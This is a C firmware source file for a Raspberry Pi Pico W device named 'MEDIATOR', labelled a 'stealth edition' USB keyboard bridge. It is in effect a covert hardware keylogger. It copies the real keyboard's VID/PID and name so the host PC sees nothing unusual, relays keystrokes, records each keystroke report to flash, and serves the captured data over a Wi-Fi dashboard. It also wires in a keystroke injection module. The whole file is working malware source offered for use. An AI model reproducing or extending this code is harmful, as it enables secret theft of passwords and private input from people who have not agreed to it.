/*
 * MEDIATOR - USB HID Keyboard Bridge (stealth edition)
 *
 * PC sees:   Exact copy of the physical keyboard (spoofed VID/PID/name, HID only)
 * Pico does: Transparently bridge keystrokes + log to flash + serve Wi-Fi dashboard
 *
 * Core 0: USB Device (native USB -> PC)  + Wi-Fi HTTP Server
 * Core 1: USB Host  (PIO-USB -> keyboard)
 *
 * Wiring:
 *   USB-A VBUS (Red)   -> Pin 40 (VBUS)
 *   USB-A GND  (Black) -> Pin 38 (GND)  [any GND pin works]
 *   USB-A D-   (White) -> Pin 19 (GPIO14)
 *   USB-A D+   (Green) -> Pin 20 (GPIO15)
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "bsp/board_api.h"
#include "tusb.h"
#include "pio_usb.h"

#include "usb_descriptors.h"
#include "hid_bridge.h"
#include "capture.h"
#include "wifi_server.h"
#include "inject.h"

// Manufacturer / Product string buffers read from keyboard during enumeration
static char g_kbd_manufacturer[64] = {0};
static char g_kbd_product[64]      = {0};

// Keyboard host address and instance - saved at mount, used for LED forwarding
uint8_t          g_kbd_dev_addr = 0;
uint8_t          g_kbd_instance = 0;
volatile bool    g_kbd_mounted  = false;

// LED forwarding state (Core 1 only - no cross-core access needed)
// Persistent buffer for async SET_REPORT transfer + busy guard.
static uint8_t       g_led_report_buf    = 0;
static volatile bool g_led_transfer_busy = false;

//--------------------------------------------------------------------+
// Core 1: USB Host task (PIO-USB - timing-critical, must be Core 1)
//--------------------------------------------------------------------+
static void core1_main(void) {
    sleep_ms(10);
    multicore_lockout_victim_init(); // allow Core 0 flash ops to stall us safely

    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp  = 15;                  // D+ = GPIO 15
    pio_cfg.pinout  = PIO_USB_PINOUT_DMDP; // D- = DP-1 = GPIO 14
    tuh_configure(BOARD_TUH_RHPORT, TUH_CFGID_RPI_PIO_USB_CONFIGURATION, &pio_cfg);
    tuh_init(BOARD_TUH_RHPORT);

    while (1) {
        tuh_task();
        // LED forwarding: Caps/Num/Scroll Lock state from PC -> physical keyboard.
        // g_led_transfer_busy ensures we never start a second control transfer
        // before the first completes (which would corrupt the host stack).
        // g_led_report_buf persists past this scope - required for async transfer.
        if (g_kbd_mounted && !g_led_transfer_busy) {
            uint8_t leds = 0;
            if (bridge_get_pending_leds(&leds)) {
                g_led_report_buf    = leds;
                g_led_transfer_busy = true;
                tuh_hid_set_report(g_kbd_dev_addr, g_kbd_instance,
                                   0, HID_REPORT_TYPE_OUTPUT, &g_led_report_buf, 1);
            }
        }
    }
}

//--------------------------------------------------------------------+
// Core 0: Main loop
//--------------------------------------------------------------------+
int main(void) {
    board_init();
    bridge_init();
    capture_init();
    inject_init();

    // USB device must init first, then Core 1 (USB host) launches.
    tud_init(BOARD_TUD_RHPORT);
    multicore_launch_core1(core1_main);

    // ------------------------------------------------------------------
    // Pre-Wi-Fi boot window and Safe Initialization
    //
    // cyw43_arch_init() blocks for ~400 ms. If we block while D+ is HIGH, 
    // Windows will send GET_DESCRIPTOR, time out because tud_task() isn't 
    // running, and throw "Unrecognized Device".
    //
    // Fix: Force a disconnect, init Wi-Fi while disconnected, then reconnect.
    // ------------------------------------------------------------------
    
    // 1. Immediately disconnect so Windows doesn't try to enumerate us yet
    tud_disconnect();

    // 2. Wait 100ms for Windows to notice the disconnect (and let Core1 start)
    uint32_t t0 = to_ms_since_boot(get_absolute_time());
    while (to_ms_since_boot(get_absolute_time()) - t0 < 100) {
        tud_task(); // process any pending disconnect events
    }

    // 3. Init Wi-Fi while safely disconnected (blocks for ~400ms)
    wifi_server_init();

    // 4. Wait until keyboard is mounted by Core 1, or 1000ms timeout
    t0 = to_ms_since_boot(get_absolute_time());
    while (!g_kbd_mounted && (to_ms_since_boot(get_absolute_time()) - t0 < 1000)) {
        // Nothing to do but wait for Core 1 to find the keyboard
        // We can't call tud_task() here because we are disconnected
        sleep_ms(10);
    }

    // 5. If we found a keyboard, g_reenumerate was set. Clear it since we're 
    // already disconnected and about to connect.
    g_reenumerate = false;

    // 6. Connect to Windows! Now tud_task() will run continuously.
    tud_connect();

    // Re-enumeration state machine for hot-plug (keyboard connected after boot)
    bool     re_enum_pending  = false;
    uint32_t re_enum_start_ms = 0;

    while (1) {
        tud_task();
        bridge_task();
        capture_task();
        wifi_server_task();
        inject_task();

        // Async re-enumeration: Core 1 sets g_reenumerate when keyboard connects.
        // Handled on Core 0 so tud_task() keeps running during the gap.
        if (g_reenumerate && !re_enum_pending) {
            g_reenumerate    = false;
            re_enum_pending  = true;
            re_enum_start_ms = to_ms_since_boot(get_absolute_time());
            tud_disconnect();
        }

        if (re_enum_pending) {
            uint32_t now = to_ms_since_boot(get_absolute_time());
            if (now - re_enum_start_ms >= 400) {   // 400 ms - enough for Windows re-enum
                re_enum_pending = false;
                tud_connect();
            }
        }
    }
}

//--------------------------------------------------------------------+
// TinyUSB Device Callbacks
//--------------------------------------------------------------------+
void tud_mount_cb(void)    {}
void tud_umount_cb(void)   {}
void tud_suspend_cb(bool r){ (void)r; }
void tud_resume_cb(void)   {}

// PC requests report - we only push via IN, nothing to return here
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
                                hid_report_type_t report_type,
                                uint8_t *buffer, uint16_t reqlen) {
    (void)instance; (void)report_id; (void)report_type;
    (void)buffer;   (void)reqlen;
    return 0;
}

// PC sends LED state (Caps Lock, Num Lock, Scroll Lock) -> store for forwarding
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id,
                            hid_report_type_t report_type,
                            uint8_t const *buffer, uint16_t bufsize) {
    (void)instance; (void)report_id;
    if (report_type == HID_REPORT_TYPE_OUTPUT && bufsize >= 1) {
        bridge_set_leds(buffer[0]);
    }
}

//--------------------------------------------------------------------+
// TinyUSB Host Callbacks (run on Core 1)
//--------------------------------------------------------------------+
void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t instance,
                      uint8_t const *desc_report, uint16_t desc_len) {
    (void)desc_report; (void)desc_len;

    // Save keyboard address for LED forwarding
    g_kbd_dev_addr = dev_addr;
    g_kbd_instance = instance;
    g_kbd_mounted  = true;

    // Read real keyboard VID/PID for spoofing
    uint16_t vid = 0, pid = 0;
    tuh_vid_pid_get(dev_addr, &vid, &pid);

    // Force boot protocol - guarantees standard 8-byte keyboard reports
    tuh_hid_set_protocol(dev_addr, instance, HID_PROTOCOL_BOOT);

    // Update our USB descriptor to spoof this keyboard's identity.
    // Returns false (no re-enum needed) if VID/PID already match.
    usb_descriptors_set_keyboard_id(vid, pid,
                                    g_kbd_manufacturer[0] ? g_kbd_manufacturer : NULL,
                                    g_kbd_product[0]      ? g_kbd_product      : NULL,
                                    NULL);

    // Start receiving HID reports
    tuh_hid_receive_report(dev_addr, instance);
}

void tuh_hid_umount_cb(uint8_t dev_addr, uint8_t instance) {
    (void)dev_addr; (void)instance;
    g_kbd_mounted = false;
    g_kbd_dev_addr = 0;
    // Push a zero report so the PC sees all keys released on disconnect.
    // Prevents any key appearing stuck after the keyboard is unplugged.
    bridge_push_zero();
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t instance,
                                 uint8_t const *report, uint16_t len) {
    if (len >= sizeof(hid_keyboard_report_t)) {
        uint8_t protocol = tuh_hid_interface_protocol(dev_addr, instance);
        if (protocol == HID_ITF_PROTOCOL_KEYBOARD || protocol == HID_ITF_PROTOCOL_NONE) {
            hid_keyboard_report_t const *kbd = (hid_keyboard_report_t const *)report;
            bridge_push_report(kbd);    // forward to PC (Core 0 picks it up)
            capture_record_report(kbd); // log to flash capture buffer
        }
    }
    tuh_hid_receive_report(dev_addr, instance); // re-arm for next report
}

// Called by TinyUSB when SET_REPORT control transfer to keyboard completes.
// Clears the busy flag so the next LED state update can be sent.
void tuh_hid_set_report_complete_cb(uint8_t dev_addr, uint8_t instance,
                                     uint8_t report_id, uint8_t report_type,
                                     uint16_t len) {
    (void)dev_addr; (void)instance; (void)report_id; (void)report_type; (void)len;
    g_led_transfer_busy = false;
}
